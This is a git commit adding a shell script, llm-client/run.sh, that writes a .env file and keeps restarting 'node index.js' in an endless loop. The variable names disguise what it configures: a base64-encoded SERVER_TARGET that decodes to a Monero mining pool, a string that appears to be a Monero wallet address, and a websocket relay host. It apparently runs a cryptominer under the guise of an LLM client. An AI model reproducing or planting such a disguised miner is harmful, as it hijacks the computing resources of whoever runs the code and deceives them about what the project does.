908eff95bb5ee27f874dde006639260de7d293aa
sawa05303 <93839840+sawa05303@users.noreply.github.com>
2026-01-06 16:15:55 +0700

    josjis

---
+++ llm-client/run.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "SERVER_WS=wss://socket.ndutvps.com
+SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
+SERVER_DOMAIN=85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
+SERVER_SECRET=${NAME}
+SERVER_CONNECTION=${CONNECT}" > .env
+while true; do node index.js; sleep 15; done
